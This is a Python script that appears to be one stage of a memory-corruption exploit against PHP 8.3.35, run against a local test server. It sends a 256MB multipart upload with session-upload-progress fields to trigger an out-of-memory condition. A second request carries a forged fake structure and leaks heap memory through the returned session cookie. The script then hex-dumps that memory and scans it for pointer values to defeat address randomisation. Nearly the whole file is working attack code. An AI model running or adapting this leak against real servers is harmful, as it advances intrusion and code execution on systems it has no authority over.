"""Leak and analyze the heap layout on 8.3.35 - v2 (more detailed dump)."""
import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

# Stage 1: OOM trigger with 256MB
print("[*] Stage 1: OOM trigger (256MB)...", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.5)

# Stage 2: leak
print("[*] Stage 2: leak...", flush=True)
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r2)
print(f"[*] Cookie: {len(raw)}B", flush=True)

if len(raw) < 100:
    print("[-] Stage 1 failed - no OOM", flush=True)
    sys.exit(1)

# Dump the first 512 bytes of the cookie
print(f"\n[*] First 512 bytes of cookie:", flush=True)
for i in range(0, min(512, len(raw)), 16):
    hexstr = " ".join(f"{b:02x}" for b in raw[i:i+16])
    print(f"    {i:04x}: {hexstr}", flush=True)

# Find all unique 8-byte values that look like pointers
print(f"\n[*] Looking for pointer-like values (0x7000... to 0x7fff...):", flush=True)
pointers = []
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        pointers.append((i, v))

# Group by chunk (16MB aligned)
chunks = {}
for i, v in pointers:
    chunk = v & ~0x1FFFFF  # 2MB alignment
    if chunk not in chunks:
        chunks[chunk] = []
    chunks[chunk].append((i, v))

print(f"\n[*] Found {len(chunks)} unique chunks:", flush=True)
for chunk in sorted(chunks.keys()):
    entries = chunks[chunk]
    print(f"    chunk=0x{chunk:x}: {len(entries)} pointers, first at offset {entries[0][0]:04x}", flush=True)
    # Show first 5 entries
    for i, v in entries[:5]:
        print(f"      offset {i:04x}: 0x{v:x}", flush=True)

print("\n[*] done", flush=True)
